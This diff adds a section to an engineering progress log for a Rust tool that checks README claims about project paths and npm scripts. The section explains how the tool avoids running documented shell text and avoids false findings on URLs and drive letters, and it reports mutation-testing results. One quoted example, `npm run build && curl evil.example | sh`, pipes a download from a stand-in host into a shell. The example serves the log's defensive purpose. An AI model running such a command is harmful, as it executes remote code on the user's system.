@@ -2568,3 +2568,232 @@ Acceptance: *"fmt/check/clippy/test evidence binds to current fingerprint."*
   it writes and the only reader reads the file *after* killing the writer. **The
   colour of a run is not the finding; the sentence the failing assertion printed
   is**, and it printed that the instrument had never been written.
+
+## P4-T005 — "not blindly run" is a claim about the source, a URL and a drive letter a code span turned into project paths, and two mutations that measured nothing until their anchors were re-read
+
+Acceptance: *"Safe claims/paths/scripts can be validated."* / *"Arbitrary README
+shell text is not blindly run."*
+
+- **The second sentence is a claim about what the code *contains*, so the thing
+  that checks it is made of the source rather than of a run.** `spawn_sites.rs` is
+  already where this crate checks absences, and its first rule —
+  `every_place_sure_builds_a_command_is_named_here` — asserts that the set of
+  shipped files whose *code* builds a `Command` equals a list of three. `setup.rs`
+  is on none of the three ways SURE can run something: it builds no `Command`; it
+  does not name `ProcessRequest`, which rule two forbids everywhere but the runner
+  and `service.rs`; and it does not name `Supervisor`, which rule three confines to
+  `service.rs`. **A test that ran the pass and watched nothing happen could not
+  tell "nothing was run" from "the fixture never parsed"**, and every absence has
+  that shape — which is why the module's own test asserts three things at once.
+  `the_documented_command_left_no_trace_and_was_still_read` writes a document whose
+  shell text would create a file in each platform's dialect
+  (`touch canary-from-bash`, `New-Item canary-from-powershell`), runs the pass, and
+  asserts that the tree is byte-for-byte what it was, that neither canary name
+  exists, **and** that all three of SURE's own sentences are free of `touch`,
+  `New-Item`, `canary` and `npm run`. The third assertion is what makes the first
+  two mean anything: a `setup.rs` that silently produced no claims would satisfy
+  them both.
+
+- **The two lists the pass produces — commands and paths — come out of one reader,
+  and keeping them from overlapping is arranged rather than hoped for.**
+  `documents.rs` did not read paths at all before this task; the whole second half
+  is new here, `DocumentedPath` and `PathForm` and the two markup readers, because
+  the byte budget, the unread accounting and the walk are the same and two passes
+  over one file are how two readings of one document come to disagree. **A command
+  and a path are both markup, and that is what makes them one decision**: the fence
+  is the author saying *this is something you run*, and the backtick or the link is
+  the author saying *this is something in the project*. A path written in prose is
+  not read at all, because there is no markup saying which noun in the sentence is
+  a path and SURE does not pick. **Paths are read from the lines outside every
+  fence**, so the two lists cannot both claim a line — a fence's own text is a
+  command, and `cp .env.example .env` names two paths and is one thing to run.
+
+- **The cost of reading a code span is paid openly, and it is one character.** A
+  span is a path candidate only when it contains a `/`, because `` `Cargo.toml` ``
+  and `` `process.env.NAME` `` have the same shape — no whitespace, a dot, letters
+  — and reading the second as a file would produce a page of claims about files
+  that do not exist. **That is the false finding this product treats as worse than
+  a visible error**, so the rule gives up every one-word span in every document and
+  the module doc states the coverage it costs rather than paying for it by
+  guessing. A link target is read whole, because `[setup](setup.md)` is a pointer
+  with no separator in it and is unambiguously a pointer. A title after a target is
+  not part of it, a `#fragment` is dropped because the file is what a scan can have
+  an entry for, and `is_plain_target` refuses the characters that mean a target is
+  a *pattern* or a *template* rather than a name: `*?` are globs, `{}` and `<…>`
+  are placeholders, `$` is a variable, `;&|` and a backtick are shell, `%` is an
+  escape, and a space separates two names. **A backslash is deliberately not
+  refused** — `docs\setup.md` is how a Windows author writes a path, and
+  `display_target` is where the two separators become one.
+
+- **A documented line becomes a claim only when it can be read as *a package
+  manager running a named script*, and everything else produces no claim at all
+  rather than a claim of unknown status.** `script_from` splits the line with
+  `split_whitespace` and then *compares*: the first word against
+  `PackageManager::from_name`, the second against the two spellings the tooling
+  actually defines. `npm run-script build` is npm's long form of `npm run build`,
+  and `test`/`start`/`stop`/`restart` are the four shorthands **npm** has, so the
+  shorthand arm carries `manager == PackageManager::Npm` inside its match guard and
+  the mutation that lifts it out is caught. The refusal is the interesting half: a
+  line containing any of `& | ; < > $ \` * ? ( ) { } " ' \ # %` names no script,
+  because a line with a pipe or a wildcard in it is a *shell program* and reading
+  its second word as a script name would be the inference `CLAUDE.md` forbids
+  outright. `%` was added during this task for the reason `documents.rs` refuses a
+  `%` in a path — it is the Windows spelling of a variable, so `npm run %BUILD%` is
+  a template a `cmd.exe` would expand and not the name of anything.
+
+- **`Contradicted` is the verdict that costs something, so it has a rule, and the
+  rule is completeness carried as a value rather than recomputed.** A path claim
+  with no reading found is contradicted *only* if nothing the walk skipped covers a
+  place the path was looked for and the walk finished: `unsettled` asks the scan
+  for such a skip and returns the sentence `Skipped::plain_description()` already
+  wrote — *"… So it cannot say whether `docs/gone.md` is there."* — with the walk's
+  own incompleteness as the second half of the same function. A script claim has
+  the coarser version: with no governing manifest at all, `Contradicted` is the
+  answer, but only when `scan.is_complete()`, and the comment on that branch says
+  outright that the rule is **deliberately coarse** — a walk that stopped early
+  gives `CannotConfirm` for every script claim in the project rather than for the
+  ones under the skipped directory, because sorting those out is a second reading
+  of the same evidence and this pass does not need it in order to be honest.
+  **`SetupReport::is_complete` delegates to `DocumentReport::is_complete`** instead
+  of restating the condition, which is what the mutation replacing its body with
+  `true` is there to hold.
+
+- **Which manifest a documented command is about is the nearest one at or above the
+  document, and a manifest SURE could not read is a third state rather than an
+  empty one.** `Manifests` pairs every `package.json` the walk found with the
+  `Package` the discovery read for it, or with `None`; `None` produces
+  `CannotConfirm` and never *"declares no scripts"*, because those are two
+  different claims about the same file and only one of them is true. The winner is
+  chosen by component depth, so a member's manifest beats the root's for a document
+  inside the member, and the test that pins it is named for the wrong answer it
+  excludes (`the_nearest_manifest_wins_and_not_the_one_that_sorts_first`). A name
+  that is in `scripts_not_commands` — an entry a package manager will not run — is
+  contradicted **as that**, in its own sentence, rather than as an absent script.
+
+- **A URL inside a code span was being read as a path in the project, and the
+  mutation set found it rather than a review.** ``Deploy to
+  `https://example.com/app`.`` contains a `/`, which was the whole of what a span
+  needed, and `https:` is not a Windows path `Prefix` — so `leaves_the_project`
+  said the reading was inside the project and a correct README came back
+  **contradicted**. That is a false finding, and it is the failure this product
+  exists to avoid. The fix belongs where the ambiguity is: `span_candidate` refuses
+  `is_absolute_reference` beside `is_plain_target`, sharing the predicate with the
+  link-target reader that already refused one — **the rule that produces the second
+  refusal is the first one**, since a span is a path *because it has a separator*
+  and a URL has two. Held by a unit test in `documents.rs` and by
+  `a_url_a_document_names_is_not_a_path_in_the_project`. The mutation that removes
+  the line was caught by those two and by nothing else on the first pass, and by
+  **four** tests on the re-run — a drive letter in a code span goes through the
+  same refusal, so the two tests added below hold this line as well.
+
+- **A drive letter was being read by the platform rather than by the document, and
+  the CI matrix found it where this machine never could.** `C:/Windows/win.ini` is
+  a `Component::Prefix` to `Path` on Windows and one ordinary relative component to
+  `Path` on Linux and macOS, so one README — a Windows instruction about where a
+  font or a toolchain lives — became a path *inside the project* on two platforms
+  out of three, was looked for, was not found, and came back **`Contradicted`**.
+  **Same false finding as the URL above, reached from the other direction**: there
+  the reader was too permissive about one string, here it was platform-correct about
+  a string whose meaning was never the platform's to decide. Run `34991517761`
+  failed `a_path_that_climbs_out_of_the_project_is_not_looked_for` on macOS and
+  Ubuntu and passed on Windows, which is the shape of a defect that cannot be found
+  on the machine it is written on. The fix is at the layer that owns the ambiguity:
+  `is_absolute_reference` asks a new `names_a_drive`, which reads one ASCII letter
+  and a colon **from the characters** and refuses the target before a `Path` exists
+  to disagree about it. **The cost is stated in the code** — a project that really
+  holds a file named `C:notes.md` loses that claim too. `leaves_the_project` still
+  asks the platform, because it takes a `Path` and both of the platform's answers
+  are correct about the value it was handed; **its test now writes both answers down
+  under `#[cfg]` instead of asserting the local one.** What the product must not do
+  — let that difference reach a verdict about a document — is held from both ends,
+  by a unit test that asserts the same thing wherever it runs and by
+  `a_windows_location_is_not_a_path_in_the_project`, and each carries a control
+  showing the same shapes *without* a drive letter are still read, so neither can
+  pass because the reader went silent.
+
+- **Two of the twenty mutation rows measured nothing on the first pass, and the
+  harness said so instead of counting them.** `m4` and `m11` were both refused with
+  *"the old text occurs 0 times in …\setup.rs, not once"* — `rustfmt` had joined
+  the `REFUSED` array onto one line and wrapped the `anchor(format!(…))` call after
+  the anchors had been written, so both `.old` files described a tree that no
+  longer existed. **A row whose anchor does not match is not a survivor and it is
+  not a pass; it is a row that has said nothing**, and the first run is recorded as
+  18 rows measured with those two named as unmeasured rather than as 20 rows with
+  18 caught. Both anchors were rewritten against the formatted source and both rows
+  re-run: `m4` is caught by
+  `setup::tests::a_line_that_is_more_than_one_command_names_no_script` and `m11` by
+  `nothing_a_document_says_can_block_a_hand_off`, each by exactly one test. **The
+  guard is why this was visible at all** — a harness that read a missing anchor as
+  "no test caught it" would have filed two survivors, and one that read it as
+  "nothing to do" would have filed two passes, and those two mistakes are in
+  opposite directions from the same silence. **The set was then re-run in full
+  against the tree this task commits: 21 rows, 21 caught, 0 survivors, 0 refused,
+  every restore verified by blob hash**, the two additions being `m20`, the URL in
+  a code span, and `m21`, *a drive letter is judged by the platform*, which exists
+  only because the defect did.
+
+- **One name in that run's catch lists is not a catch, and it is recorded as an
+  unattributed failure rather than counted.** `m14`'s list holds four names where
+  the previous run held three, and the fourth is
+  `a_service_that_is_dropped_is_stopped_anyway` — `P3-T009`'s test, in a binary
+  whose source contains **no occurrence of `setup` at all**, so the mutation cannot
+  reach it and the failure cannot be its doing. **The row's attributable catches are
+  three, and they are the same three as before.** The failure was not reproducible:
+  **30 serial runs and 60 runs of six concurrent instances of that binary all pass**
+  on this machine, and the fixture is process-id-unique (`sure-service-{name}-{pid}`)
+  so the concurrency was real load rather than a collision. What fired is
+  `P3-T009`'s test, once, under the load of a suite that starts and stops process
+  trees twenty-one times. **Which assertion fired is not known and is not guessed
+  at**: `mutate3.py` prints failing test *names* and the test-result lines, and the
+  panic text went out of scope with the run, so the one thing that would say what
+  happened is the one thing the instrument did not keep — which is a limit of this
+  harness worth knowing, since it was written to report names and had to be read as
+  if it reported reasons. It is recorded as an open observation about `P3-T009`
+  rather than as a defect this task found or fixed, because **"not reproduced" is
+  not "not there"**, and a count that quietly absorbed it would be the false green
+  this whole section is about.
+
+- **A line-ending question was asked of `grep`, `grep` answered wrong, and the
+  answer had to come from the bytes instead.** `grep -c $'\r'` reported a carriage
+  return on **every line** of `setup.rs`, `documents.rs` and both progress files —
+  all of which are pure LF — so a reader who believed it would have "fixed" four
+  files that were never broken. `git ls-files --eol` (`i/lf w/lf`) and a byte count
+  in Python both say LF and agree with each other, and that agreement is what
+  settles it. **The one real finding inside the false one was real**:
+  `progress/HANDOFF.md` was `w/crlf` against an LF blob, so the working copy is now
+  LF and the `git diff` warning it produced is gone. A line-ending claim is a claim
+  about bytes, so the instrument has to be one that reads bytes.
+
+- **A doc comment asserted behaviour the code does not have, and reading it against
+  the committed function is the only thing that caught it.** The module
+  documentation said `npm run build && curl evil.example | sh` "yields the name
+  `build`". `script_from` compares every word against `is_plain_word`, and `&` and
+  `|` are both in its refusal set, so the line names **nothing at all**. **The code
+  was right and the sentence was wrong** — the refusal is the safer reading, which
+  is why no test failed and no mutation row could have found it — and a comment is
+  exactly how a guarantee comes to be believed without being one. Rewritten to say
+  what happens, and to name the case that *does* yield a name:
+  `npm run build --silent` names `build`, and the flag is never read.
+
+- **Nothing a document says may block a hand-off, and severity is where that is
+  decided.** Every `Contradicted` this module produces carries
+  `Severity::ShouldFixFirst` — never `MustFix`, which `FROZEN_SEMANTICS.md` defines
+  as blocking a hand-off alone. The reason is not tone: *"the README says
+  `npm run build` and the manifest declares no `build`"* is a disagreement between
+  two artefacts where **the wrong half is not knowable from here**, and a `MustFix`
+  has to stand on an `ObservedFact` by itself.
+  `nothing_a_document_says_can_block_a_hand_off` asserts it over every claim in a
+  fixture that contradicts in both of the ways this module can contradict, and
+  `m11`, which switches one branch to `MustFix`, is caught by that test and by
+  nothing else.
+
+- **Project text reaches a reader through two doors and no others.**
+  `SetupClaim::quoted()` returns a document's full text as a value and is the only
+  method that does; every name appearing *inside a sentence SURE writes* goes
+  through `in_a_sentence`, which is `redact::escape_control_characters`. A script
+  name holding a newline can therefore add a line to a report only by way of the
+  field a caller explicitly asked for, never by way of a reason string.
+  **`Assessed::evidence()` returns an empty vector for a claim it could not
+  settle**, deliberately: the anchor would name the manifest SURE never read, and
+  an anchor pointing at a file nobody opened reads to the next consumer as though
+  somebody had.
